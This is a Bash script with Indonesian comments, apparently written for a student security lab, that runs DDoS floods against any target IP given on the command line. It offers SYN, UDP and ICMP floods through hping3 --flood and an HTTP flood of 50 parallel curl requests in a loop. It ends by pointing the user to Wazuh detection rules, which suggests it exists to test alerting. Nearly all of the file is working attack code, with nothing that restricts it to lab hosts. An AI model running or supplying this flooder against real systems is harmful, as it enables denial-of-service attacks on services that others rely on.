#!/bin/bash
# ================================================================
# ddos_attack.sh — Simulasi DDoS dari Agent-2 ke Agent-1
# Kelompok 7 ITS — MIKS 2026
#
# Penggunaan:
#   sudo bash ddos_attack.sh <tipe> <target_ip> [durasi_detik]
#
# Tipe tersedia: syn | udp | icmp | http | all
#
# Contoh:
#   sudo bash ddos_attack.sh syn  10.0.0.5 30
#   sudo bash ddos_attack.sh http 10.0.0.5 60
#   sudo bash ddos_attack.sh all  10.0.0.5 30
# ================================================================

set -euo pipefail

TYPE="${1:-}"
TARGET="${2:-}"
DURATION="${3:-30}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; NC='\033[0m'

usage() {
    echo -e "${CYAN}Penggunaan: sudo bash $0 <tipe> <target_ip> [durasi_detik]${NC}"
    echo -e "  Tipe: syn | udp | icmp | http | all"
    exit 1
}

[[ -z "$TYPE" || -z "$TARGET" ]] && usage

check_tools() {
    local missing=()
    command -v hping3 &>/dev/null || missing+=("hping3")
    command -v curl   &>/dev/null || missing+=("curl")
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[ERROR] Tool tidak ditemukan: ${missing[*]}${NC}"
        echo "Install: sudo apt-get install -y hping3 curl"
        exit 1
    fi
}

run_syn() {
    echo -e "${RED}[SYN FLOOD] Target: $TARGET:80, durasi: ${DURATION}s${NC}"
    timeout "$DURATION" sudo hping3 -S --flood -V -p 80 "$TARGET" 2>&1 | tail -3 || true
    echo -e "${GREEN}[SYN] Selesai${NC}"
}

run_udp() {
    echo -e "${RED}[UDP FLOOD] Target: $TARGET:53, durasi: ${DURATION}s${NC}"
    timeout "$DURATION" sudo hping3 --udp --flood -V -p 53 "$TARGET" 2>&1 | tail -3 || true
    echo -e "${GREEN}[UDP] Selesai${NC}"
}

run_icmp() {
    echo -e "${RED}[ICMP FLOOD] Target: $TARGET, durasi: ${DURATION}s${NC}"
    timeout "$DURATION" sudo hping3 --icmp --flood -V "$TARGET" 2>&1 | tail -3 || true
    echo -e "${GREEN}[ICMP] Selesai${NC}"
}

run_http() {
    echo -e "${RED}[HTTP FLOOD L7] Target: http://$TARGET/, durasi: ${DURATION}s, 50 worker paralel${NC}"
    local end_time=$(( $(date +%s) + DURATION ))
    local count=0

    while [[ $(date +%s) -lt $end_time ]]; do
        for _ in $(seq 1 50); do
            curl -s -o /dev/null --max-time 2 "http://$TARGET/" &
        done
        wait
        (( count += 50 ))
        echo -ne "\r  Request terkirim: $count"
    done
    echo -e "\n${GREEN}[HTTP] Selesai — total ~$count request${NC}"
}

check_tools

echo -e "${YELLOW}============================================${NC}"
echo -e "${YELLOW}  DDoS Simulation — Kelompok 7 ITS${NC}"
echo -e "${YELLOW}  Target: $TARGET | Durasi: ${DURATION}s${NC}"
echo -e "${YELLOW}============================================${NC}"
echo ""

case "$TYPE" in
    syn)  run_syn  ;;
    udp)  run_udp  ;;
    icmp) run_icmp ;;
    http) run_http ;;
    all)
        run_syn
        sleep 2
        run_udp
        sleep 2
        run_icmp
        sleep 2
        run_http
        ;;
    *)    usage ;;
esac

echo ""
echo -e "${GREEN}[DONE] Simulasi selesai. Cek alert di Wazuh Dashboard.${NC}"
echo -e "  → Threat Hunting: rule.id:100200 (SYN) | rule.id:100402 (HTTP)"
